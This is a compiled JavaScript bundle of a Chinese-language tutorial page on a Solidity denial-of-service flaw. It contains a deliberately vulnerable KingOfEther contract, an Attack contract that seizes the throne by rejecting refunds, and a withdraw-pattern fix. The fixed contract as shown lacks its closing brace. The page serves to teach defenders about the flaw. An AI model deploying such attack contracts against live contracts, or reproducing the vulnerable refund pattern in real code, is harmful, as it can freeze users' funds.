"use strict";(self.webpackChunkweb_3_blog=self.webpackChunkweb_3_blog||[]).push([[8749],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>f});var r=t(7294);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,i=function(e,n){if(null==e)return{};var t,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var c=r.createContext({}),s=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},u=function(e){var n=s(e.components);return r.createElement(c.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},p=r.forwardRef((function(e,n){var t=e.components,i=e.mdxType,a=e.originalType,c=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),p=s(t),f=i,g=p["".concat(c,".").concat(f)]||p[f]||d[f]||a;return t?r.createElement(g,o(o({ref:n},u),{},{components:t})):r.createElement(g,o({ref:n},u))}));function f(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var a=t.length,o=new Array(a);o[0]=p;var l={};for(var c in n)hasOwnProperty.call(n,c)&&(l[c]=n[c]);l.originalType=e,l.mdxType="string"==typeof e?e:i,o[1]=l;for(var s=2;s<a;s++)o[s]=t[s];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}p.displayName="MDXCreateElement"},5647:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>a,metadata:()=>l,toc:()=>s});var r=t(7462),i=(t(7294),t(3905));const a={},o="\u62d2\u7edd\u670d\u52a1",l={unversionedId:"solidity/solidity_hack/denial_of_service",id:"solidity/solidity_hack/denial_of_service",title:"\u62d2\u7edd\u670d\u52a1",description:"\u901a\u8fc7\u53d1\u9001eth\u5931\u8d25\u662f\u5b9e\u73b0\u62d2\u7edd\u670d\u52a1",source:"@site/docs/solidity/solidity_hack/denial_of_service.md",sourceDirName:"solidity/solidity_hack",slug:"/solidity/solidity_hack/denial_of_service",permalink:"/docs/solidity/solidity_hack/denial_of_service",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"solidity",previous:{title:"\u968f\u673a\u6027\u6765\u6e90",permalink:"/docs/solidity/solidity_hack/source_of_randomness"},next:{title:"tx.origin\u9493\u9c7c",permalink:"/docs/solidity/solidity_hack/phishing_with_tx_orgin"}},c={},s=[{value:"\u9884\u9632\u6280\u672f",id:"\u9884\u9632\u6280\u672f",level:3}],u={toc:s};function d(e){let{components:n,...t}=e;return(0,i.kt)("wrapper",(0,r.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"\u62d2\u7edd\u670d\u52a1"},"\u62d2\u7edd\u670d\u52a1"),(0,i.kt)("p",null,"\u901a\u8fc7\u53d1\u9001eth\u5931\u8d25\u662f\u5b9e\u73b0\u62d2\u7edd\u670d\u52a1"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\n/*\nKingOfEther \u7684\u76ee\u6807\u662f\u901a\u8fc7\u53d1\u9001\u66f4\u591a\u7684 ETH \u6210\u4e3a\u56fd\u738b\u3002\n\u524d\u56fd\u738b\u5c06\u9000\u8fd8\u4ee5\u592a\u5e01\u6570\u91cf\n*/\n\n/*\n1. \u90e8\u7f72 \u5408\u7ea6\n2. alice \u53d1\u9001 1 eth \u6210\u4e3a king\n3. bob \u53d1\u9001 2 eth \u6210\u4e3aing. alice \u63a5\u6536\u5230\u9000\u8fd8 1 eth\n4. \u90e8\u7f72 attck\n5. \u8c03\u7528 attack \u4f7f\u7528 3 eth\n6. attact \u6210\u4e3aking, \u540c\u65f6 \u6ca1\u6709\u4eba\u6210\u4e3a\u65b0\u7684king\n\n\n\u53d1\u751f\u4e86\u4ec0\u4e48\uff1f\n\n\u6240\u6709\u6210\u4e3aking\u7684\u65b0\u6311\u6218\u90fd\u5c06\u88ab\u62d2\u7edd.\u56e0\u4e3aattack \u6ca1\u6709 fallback \u51fd\u6570\uff0c\u62d2\u7edd\u63a5\u53d7ether.\n*/\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, "Need to pay more to become the king");\n\n        (bool sent, ) = king.call{value: balance}("");\n        require(sent, "Failed to send Ether");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    // \u60a8\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 assert \u6d88\u8017\u6240\u6709\u6c14\u4f53\u6765\u6267\u884c DOS\u3002\n    // This attack will work even if the calling contract does not check\n    // whether the call was successful or not.\n    //\n    // function () external payable {\n    //     assert(false);\n    // }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n')),(0,i.kt)("h3",{id:"\u9884\u9632\u6280\u672f"},"\u9884\u9632\u6280\u672f"),(0,i.kt)("p",null,"\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u5141\u8bb8\u7528\u6237\u63d0\u53d6\u4ed6\u4eec\u7684eth\u800c\u4e0d\u662f\u53d1\u9001\u5b83\u3002"),(0,i.kt)("p",null,"\u4f7f\u7528\u63d0\u6b3e\u6a21\u5f0f\uff1a"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n    mapping(address => uint) public balances;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, "Need to pay more to become the king");\n\n        balances[king] += balance;\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n\n    function withdraw() public {\n        require(msg.sender != king, "Current king cannot withdraw");\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}("");\n        require(sent, "Failed to send Ether");\n    }\n')))}d.isMDXComponent=!0}}]);